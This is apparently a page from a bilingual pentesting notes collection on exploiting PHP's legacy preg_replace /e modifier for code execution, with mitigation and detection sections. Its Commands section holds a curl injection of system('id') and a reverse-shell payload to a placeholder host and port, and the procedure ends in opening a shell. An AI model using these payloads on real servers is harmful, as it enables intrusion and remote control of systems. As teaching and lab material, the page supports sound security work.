---
topic: PHP — execution through preg_replace /e
tags: [web, php, preg_replace, rce, legacy]
---

# PHP — execution through preg_replace /e

**English** | [🌐 Español](php-preg-replace-e.md)

## Concept

The `/e` modifier of `preg_replace` evaluates the replacement as PHP code after substitution. If the replacement includes user input, any match becomes remote code execution. The modifier was removed in PHP 7 but remains in legacy applications.

## When it applies

- The application uses `preg_replace` with `/e`.
- The pattern or replacement depends on a controllable parameter.
- The server runs an old PHP version.

## Procedure

1. Locate `preg_replace` calls with `/e`.
2. Find a parameter that reaches the replacement.
3. Inject a valid PHP call and verify execution.
4. Use execution to obtain a reverse shell.

## Commands

```bash
grep -RIn "preg_replace.*\/e" /var/www/html
curl -s "http://<HOST>/search.php?q=system('id')"
# Reverse shell payload
curl -s "http://<HOST>/search.php?q=system('bash -c \"bash -i >& /dev/tcp/<IP>/4444 0>&1\"')"
```

## Variants

- Inject into the pattern when the replacement is fixed.
- Use `assert` or `create_function` on even older versions.
- Chain it with a file inclusion.

## Limitations

- Only works on PHP older than 7.
- The pattern may escape special characters.
- `disable_functions` may block `system`.

## Mitigation

- Migrate to `preg_replace_callback` and update PHP.
- Never pass user input into patterns or replacements.
- Apply a WAF and review legacy code.

## Detection

- `preg_replace` calls with `/e` in the code.
- Parameters containing PHP functions or backticks.
- Web processes spawning shells.

## References

- [PHP — preg_replace](https://www.php.net/manual/en/function.preg-replace.php)
- [0xdf — Europa](https://0xdf.gitlab.io/2021/02/02/htb-europa.html)
- [CWE-94 — Code Injection](https://cwe.mitre.org/data/definitions/94.html)
